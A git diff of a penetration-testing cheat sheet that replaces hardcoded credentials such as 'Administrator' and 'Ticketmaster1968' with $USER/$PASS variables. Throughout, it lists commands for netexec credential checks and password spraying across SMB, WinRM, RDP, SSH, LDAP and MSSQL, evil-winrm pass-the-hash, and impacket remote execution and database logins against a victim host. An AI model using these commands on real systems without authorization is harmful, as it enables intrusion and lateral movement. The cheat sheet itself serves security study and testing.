@@ -13,16 +13,16 @@ ____
 
 ```bash
 # Test SMB, WinRM, RDP, SSH, LDAP, MSSQL all at once
-nxc smb $VICTIM_IP -u user -p pass
-nxc winrm $VICTIM_IP -u user -p pass
-nxc rdp $VICTIM_IP -u user -p pass
-nxc ssh $VICTIM_IP -u user -p pass
-nxc ldap $VICTIM_IP -u user -p pass
-nxc mssql $VICTIM_IP -u user -p pass
+nxc smb $VICTIM_IP -u $USER -p $PASS
+nxc winrm $VICTIM_IP -u $USER -p $PASS
+nxc rdp $VICTIM_IP -u $USER -p $PASS
+nxc ssh $VICTIM_IP -u $USER -p $PASS
+nxc ldap $VICTIM_IP -u $USER -p $PASS
+nxc mssql $VICTIM_IP -u $USER -p $PASS
 
 
 # --local-auth tells nxc to authenticate using a local account instead of a domain account.
-nxc mssql $VICTIM_IP --local-auth -u username -p passwords.txt
+nxc mssql $VICTIM_IP --local-auth -u $USER -p passwords.txt
 ```
 
 ____
@@ -41,11 +41,11 @@ impacket-wmiexec Administrator:'Ticketmaster1968'@$VICTIM_IP
 ### <span style="color:#50FA7B">WinRM (Port 5985/5986)</span>
 ```bash
 # HTTP (port 5985)
-evil-winrm -i $VICTIM_IP -u Administrator -p 'Ticketmaster1968'
+evil-winrm -i $VICTIM_IP -u $USER -p '$PASS'
 # HTTPS (port 5986) - add -S flag
-evil-winrm -S -i $VICTIM_IP -u Administrator -p 'Ticketmaster1968'
+evil-winrm -S -i $VICTIM_IP -u $USER -p '$PASS'
 # With hash (pass-the-hash)
-evil-winrm -i $VICTIM_IP -u Administrator -H 'NTLM_HASH'
+evil-winrm -i $VICTIM_IP -u $USER -H 'NTLM_HASH'
 ```
 
 ### <span style="color:#50FA7B">WMI (Port 135, 5985)</span>
@@ -81,8 +81,8 @@ ssh -i private_key Administrator@$VICTIM_IP
 impacket-mssqlclient Administrator:'Ticketmaster1968'@$VICTIM_IP
 
 # MySQL (port 3306)
-mysql -u Administrator -p'Ticketmaster1968' -h $VICTIM_IP
+mysql -u $USER -p'$PASS' -h $VICTIM_IP
 
 # PostgreSQL (port 5432)
-psql -h $VICTIM_IP -U Administrator -W
+psql -h $VICTIM_IP -U $USER -W
 ```
